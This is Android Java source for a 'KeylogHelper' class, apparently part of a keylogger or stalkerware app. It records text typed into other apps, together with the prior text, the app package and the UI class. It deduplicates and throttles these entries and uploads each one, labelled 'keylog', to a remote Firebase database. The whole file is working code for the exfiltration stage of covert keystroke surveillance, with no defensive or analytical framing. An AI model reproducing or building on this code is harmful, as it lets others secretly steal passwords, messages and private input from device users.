package com.busho.app.helpers;

import android.util.Log;

import com.google.firebase.database.DatabaseReference;

import java.security.MessageDigest;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

public class KeylogHelper {
    private static final String TAG = "KeylogHelper";
    private static final long MIN_UPLOAD_INTERVAL_MS = 300;

    private static final Map<String, Long> lastUploadTimes = new ConcurrentHashMap<>();
    private static final Map<String, String> lastUploadedText = new ConcurrentHashMap<>();

    private KeylogHelper() {
    }

    public static void upload(String userId, String packageName, String eventType, String text,
                              String beforeText, String className, long timestamp) {
        if (userId == null || packageName == null || packageName.trim().isEmpty()) {
            return;
        }

        String normalizedText = text != null ? text : "";
        String normalizedBefore = beforeText != null ? beforeText : "";
        String normalizedClass = className != null ? className : "";

        if ("text_changed".equals(eventType)) {
            if (normalizedText.trim().isEmpty()) {
                return;
            }
            String dedupeKey = packageName + "|" + normalizedClass;
            String previous = lastUploadedText.get(dedupeKey);
            if (normalizedText.equals(previous)) {
                return;
            }
            Long lastTime = lastUploadTimes.get(dedupeKey);
            long now = System.currentTimeMillis();
            if (lastTime != null && (now - lastTime) < MIN_UPLOAD_INTERVAL_MS) {
                return;
            }
            lastUploadedText.put(dedupeKey, normalizedText);
            lastUploadTimes.put(dedupeKey, now);
        } else {
            String dedupeKey = packageName + "|" + eventType;
            long now = System.currentTimeMillis();
            Long lastTime = lastUploadTimes.get(dedupeKey);
            if (lastTime != null && (now - lastTime) < 2000) {
                return;
            }
            lastUploadTimes.put(dedupeKey, now);
        }

        String keylogId = generateKeylogId(packageName, eventType, normalizedText, timestamp);
        Map<String, Object> entry = new HashMap<>();
        entry.put("dataType", "keylog");
        entry.put("packageName", packageName);
        entry.put("eventType", eventType);
        entry.put("text", normalizedText);
        entry.put("beforeText", normalizedBefore);
        entry.put("className", normalizedClass);
        entry.put("timestamp", timestamp);
        entry.put("uploadedAt", System.currentTimeMillis());
        entry.put("userId", userId);

        DatabaseReference keylogsRef = FirebaseDataPaths.keylogs(userId).child(keylogId);
        keylogsRef.setValue(entry)
                .addOnSuccessListener(unused ->
                        Log.d(TAG, "Keylog uploaded: " + packageName + " / " + eventType))
                .addOnFailureListener(e -> Log.e(TAG, "Failed to upload keylog", e));

        FirebaseDataPaths.updateSyncStatus(userId, "keylogs", 1);
    }

    private static String generateKeylogId(String packageName, String eventType, String text, long timestamp) {
        try {
            MessageDigest md = MessageDigest.getInstance("MD5");
            String input = packageName + "_" + eventType + "_"
                    + text.substring(0, Math.min(text.length(), 100)) + "_" + timestamp;
            byte[] hashBytes = md.digest(input.getBytes());
            StringBuilder sb = new StringBuilder();
            for (byte b : hashBytes) {
                sb.append(String.format("%02x", b));
            }
            return sb.toString();
        } catch (Exception e) {
            return packageName + "_" + timestamp + "_" + text.hashCode();
        }
    }
}
